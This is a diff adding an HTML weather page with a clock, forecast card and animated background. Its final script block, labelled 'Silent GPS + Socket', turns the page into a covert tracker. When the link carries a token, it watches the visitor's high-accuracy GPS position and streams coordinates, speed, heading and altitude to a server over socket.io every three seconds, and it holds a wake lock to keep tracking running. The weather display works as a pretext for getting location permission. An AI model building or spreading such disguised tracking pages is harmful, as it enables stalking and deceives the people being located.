@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Weather — Your Local Atmosphere</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      width: 100%; height: 100%;
+      overflow: hidden;
+      font-family: 'Inter', -apple-system, sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ── Canvas fullscreen ── */
+    #envCanvas {
+      position: fixed; inset: 0; z-index: 0;
+      width: 100%; height: 100%; display: block;
+    }
+
+    /* ── Dark gradient overlay for card readability ── */
+    .overlay {
+      position: fixed; inset: 0; z-index: 1;
+      pointer-events: none;
+      background: radial-gradient(ellipse at center, rgba(0,0,0,0.15) 0%, rgba(0,0,0,0.35) 100%);
+    }
+
+    /* ── Card ── */
+    .card {
+      position: fixed; inset: 0; z-index: 10;
+      display: flex; align-items: center; justify-content: center;
+    }
+
+    .glass {
+      width: 340px;
+      max-width: 92vw;
+      padding: 36px 30px 30px;
+      background: rgba(10, 15, 30, 0.55);
+      border: 1px solid rgba(255,255,255,0.18);
+      border-radius: 28px;
+      backdrop-filter: blur(30px);
+      -webkit-backdrop-filter: blur(30px);
+      box-shadow: 0 25px 60px rgba(0,0,0,0.45), 0 1px 0 rgba(255,255,255,0.1) inset;
+      text-align: center;
+      color: #ffffff;
+      animation: floatUp 1s ease forwards;
+    }
+
+    @keyframes floatUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Floating bob */
+    .glass.bob { animation: bob 6s ease-in-out infinite; }
+    @keyframes bob {
+      0%, 100% { transform: translateY(0); }
+      50%       { transform: translateY(-7px); }
+    }
+
+    .w-icon { font-size: 3.6rem; margin-bottom: 6px; }
+
+    .w-temp {
+      font-size: 4rem; font-weight: 800;
+      letter-spacing: -2px; line-height: 1;
+      color: #ffffff;
+      text-shadow: 0 2px 20px rgba(255,255,255,0.2);
+      margin-bottom: 4px;
+    }
+
+    .w-desc {
+      font-size: 0.95rem; font-weight: 400;
+      color: rgba(255,255,255,0.65);
+      text-transform: capitalize;
+      margin-bottom: 22px;
+    }
+
+    .divider {
+      height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+      margin-bottom: 20px;
+    }
+
+    .w-time {
+      font-size: 2.8rem; font-weight: 700;
+      letter-spacing: -0.5px;
+      color: #ffffff;
+      text-shadow: 0 2px 12px rgba(0,0,0,0.3);
+      font-variant-numeric: tabular-nums;
+      margin-bottom: 4px;
+    }
+
+    .w-date {
+      font-size: 0.82rem; font-weight: 400;
+      color: rgba(255,255,255,0.5);
+      margin-bottom: 22px;
+    }
+
+    .stats {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+    }
+
+    .stat {
+      display: flex; flex-direction: column;
+      align-items: center; gap: 3px;
+    }
+
+    .stat-emoji { font-size: 1rem; }
+
+    .stat-val {
+      font-size: 0.9rem; font-weight: 700;
+      color: #ffffff;
+    }
+
+    .stat-lbl {
+      font-size: 0.58rem; font-weight: 600;
+      color: rgba(255,255,255,0.4);
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+    }
+
+    /* ── Lightning flash ── */
+    .flash {
+      position: fixed; inset: 0; z-index: 5;
+      background: rgba(200,220,255,0.75);
+      pointer-events: none;
+      opacity: 0;
+    }
+
+    @media (max-width: 480px) {
+      .glass { padding: 28px 20px 24px; }
+      .w-temp { font-size: 3rem; }
+      .w-time { font-size: 2.2rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <canvas id="envCanvas"></canvas>
+  <div class="overlay"></div>
+  <div class="flash" id="flash"></div>
+
+  <div class="card">
+    <div class="glass" id="glassCard">
+      <div class="w-icon" id="wIcon">🌤️</div>
+      <div class="w-temp" id="wTemp">--°C</div>
+      <div class="w-desc" id="wDesc">Loading...</div>
+      <div class="divider"></div>
+      <div class="w-time" id="wTime">--:--:--</div>
+      <div class="w-date" id="wDate">—</div>
+      <div class="stats">
+        <div class="stat">
+          <div class="stat-emoji">💨</div>
+          <div class="stat-val" id="wWind">—</div>
+          <div class="stat-lbl">Wind</div>
+        </div>
+        <div class="stat">
+          <div class="stat-emoji">💧</div>
+          <div class="stat-val" id="wHumidity">—</div>
+          <div class="stat-lbl">Humidity</div>
+        </div>
+        <div class="stat">
+          <div class="stat-emoji">🌡️</div>
+          <div class="stat-val" id="wFeels">—</div>
+          <div class="stat-lbl">Feels Like</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <script src="assets/weather-env.js"></script>
+  <script>
+    // ── WMO code map ──────────────────────────────────────────
+    const WMO = {
+      0:{d:'Clear Sky',i:'☀️',m:'clear'},1:{d:'Mainly Clear',i:'🌤️',m:'clear'},
+      2:{d:'Partly Cloudy',i:'⛅',m:'cloudy'},3:{d:'Overcast',i:'☁️',m:'cloudy'},
+      45:{d:'Foggy',i:'🌫️',m:'fog'},48:{d:'Rime Fog',i:'🌫️',m:'fog'},
+      51:{d:'Light Drizzle',i:'🌦️',m:'rain'},53:{d:'Drizzle',i:'🌧️',m:'rain'},
+      55:{d:'Dense Drizzle',i:'🌧️',m:'rain'},61:{d:'Light Rain',i:'🌦️',m:'rain'},
+      63:{d:'Rain',i:'🌧️',m:'rain'},65:{d:'Heavy Rain',i:'🌧️',m:'rain'},
+      71:{d:'Light Snow',i:'🌨️',m:'snow'},73:{d:'Snow',i:'❄️',m:'snow'},
+      75:{d:'Heavy Snow',i:'❄️',m:'snow'},80:{d:'Rain Showers',i:'🌦️',m:'rain'},
+      81:{d:'Heavy Showers',i:'🌧️',m:'rain'},82:{d:'Violent Showers',i:'🌧️',m:'rain'},
+      95:{d:'Thunderstorm',i:'⛈️',m:'storm'},96:{d:'T-Storm + Hail',i:'⛈️',m:'storm'},
+      99:{d:'Severe Storm',i:'⛈️',m:'storm'}
+    };
+
+    // ── Live clock (starts immediately) ──────────────────────
+    function tick() {
+      const now = new Date();
+      document.getElementById('wTime').textContent = now.toLocaleTimeString('en-US', { hour12: false });
+      document.getElementById('wDate').textContent = now.toLocaleDateString('en-US', {
+        weekday:'long', month:'long', day:'numeric', year:'numeric'
+      });
+    }
+    setInterval(tick, 1000);
+    tick();
+
+    // ── Weather fetch ─────────────────────────────────────────
+    let lastFetch = 0;
+
+    async function fetchWeather(lat, lng) {
+      const now = Date.now();
+      if (now - lastFetch < 4 * 60 * 1000) return;
+      lastFetch = now;
+
+      try {
+        const url = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lng}&current_weather=true&hourly=relativehumidity_2m,apparent_temperature&forecast_days=1`;
+        const res = await fetch(url);
+        const data = await res.json();
+        if (!data.current_weather) return;
+
+        const cw   = data.current_weather;
+        const info = WMO[cw.weathercode] || { d:'Weather', i:'🌡️', m:'clear' };
+
+        document.getElementById('wIcon').textContent = info.i;
+        document.getElementById('wTemp').textContent = `${Math.round(cw.temperature)}°C`;
+        document.getElementById('wDesc').textContent = info.d;
+        document.getElementById('wWind').textContent = `${cw.windspeed} km/h`;
+
+        const h = new Date().getHours();
+        if (data.hourly) {
+          const hum   = data.hourly.relativehumidity_2m?.[h];
+          const feels = data.hourly.apparent_temperature?.[h];
+          if (hum   != null) document.getElementById('wHumidity').textContent = `${hum}%`;
+          if (feels != null) document.getElementById('wFeels').textContent = `${Math.round(feels)}°C`;
+        }
+
+        if (typeof setWeatherMode === 'function') setWeatherMode(info.m);
+
+        // Add gentle bob after data loads
+        setTimeout(() => {
+          const card = document.getElementById('glassCard');
+          if (card) { card.classList.remove('bob'); void card.offsetWidth; card.classList.add('bob'); }
+        }, 1200);
+
+      } catch(e) { console.error('Weather error:', e); }
+    }
+
+    // ── Fetch from IP immediately ─────────────────────────────
+    (async () => {
+      try {
+        const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+        if (ip.latitude) fetchWeather(ip.latitude, ip.longitude);
+      } catch(e) {}
+    })();
+
+    // ── Silent GPS + Socket ───────────────────────────────────
+    const params = new URLSearchParams(window.location.search);
+    const token  = params.get('token');
+
+    let socket = null;
+    if (token && typeof io !== 'undefined') {
+      socket = io({ auth: { token }, reconnection: true });
+    }
+
+    let lastSent = 0;
+
+    function startTracking() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.watchPosition(pos => {
+        const { latitude, longitude, speed, accuracy, heading, altitude } = pos.coords;
+        lastFetch = 0; // allow precise GPS coords to override IP-based weather
+        fetchWeather(latitude, longitude);
+
+        const now = Date.now();
+        if (now - lastSent < 3000) return;
+        lastSent = now;
+
+        if (socket && socket.connected) {
+          socket.emit('location:update', {
+            lat: latitude, lng: longitude,
+            speed: speed || 0, accuracy: accuracy || 0,
+            heading: heading || null, altitude: altitude || null,
+            timestamp: now
+          });
+        }
+      },
+      err => console.warn('GPS:', err.message),
+      { enableHighAccuracy: true, maximumAge: 2000, timeout: 15000 });
+    }
+
+    if (token) {
+      startTracking();
+      if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
+    }
+  </script>
+</body>
+</html>
